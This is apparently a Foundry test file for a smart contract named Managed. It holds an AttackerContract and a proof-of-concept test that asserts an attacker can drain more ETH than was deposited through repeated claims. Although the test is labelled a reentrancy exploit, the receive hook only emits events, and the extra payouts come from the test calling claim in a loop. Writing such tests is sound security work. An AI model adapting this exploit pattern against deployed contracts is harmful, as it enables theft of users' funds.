// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Managed.sol";

contract AttackerContract {
    Managed public targetContract;
    string public userId;
    uint256 public attackCount;
    event AttackLog(uint256 amount, uint256 count);

    constructor(address payable _target) {
        targetContract = Managed(payable(_target));
    }

    // This function will be called when we receive ETH
    receive() external payable {
        emit AttackLog(msg.value, attackCount);
        
        if (attackCount < 3) {
            attackCount++;
            // Instead of trying to call claim directly, we'll emit an event
            // that our test can watch for and respond to
            emit RequestClaim(userId, address(this));
        }
    }

    // Event to signal when we want to make a claim
    event RequestClaim(string userId, address beneficiary);

    function attack(string memory _userId) external {
        userId = _userId;
        attackCount = 0;
        emit RequestClaim(userId, address(this));
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract ManagedTest is Test {
    Managed public managed;
    AttackerContract public attacker;
    address public creator;
    
    function setUp() public {
        creator = address(this);
        managed = new Managed(creator, "TestHolon");
        attacker = new AttackerContract(payable(address(managed)));
        
        // Fund the contract
        vm.deal(address(managed), 10 ether);
    }
    
    function testReentrancyExploit() public {
        string memory attackerId = "attacker";
        
        // Add attacker as a member
        managed.addMember(attackerId);
        
        // Deposit ETH for the attacker
        uint256 depositAmount = 1 ether;
        vm.deal(address(this), depositAmount);
        managed.depositEtherForUser{value: depositAmount}(attackerId, depositAmount);
        
        // Log initial state
        console.log("Initial state:");
        console.log("Contract balance:", address(managed).balance);
        console.log("Attacker balance:", attacker.getBalance());
        console.log("Recorded balance:", managed.etherBalance(attackerId));
        
        // Start monitoring for claim requests
        vm.expectEmit(true, true, false, true);
        emit AttackerContract.RequestClaim(attackerId, address(attacker));
        
        // Start the attack as creator
        vm.startPrank(creator);
        attacker.attack(attackerId);
        
        // Listen for and handle claim requests
        // In a real attack, this would be the bot handling messages
        for (uint i = 0; i < 3; i++) {
            managed.claim(attackerId, address(attacker));
        }
        vm.stopPrank();
        
        // Log final state
        console.log("\nFinal state:");
        console.log("Contract balance:", address(managed).balance);
        console.log("Attacker balance:", attacker.getBalance());
        console.log("Recorded balance:", managed.etherBalance(attackerId));
        
        // Verify the exploit
        assertGt(attacker.getBalance(), depositAmount, "Attacker should have gained extra ETH");
        assertEq(managed.etherBalance(attackerId), 0, "Recorded balance should be zero");
        assertTrue(managed.hasClaimed(attackerId), "Should be marked as claimed");
    }
}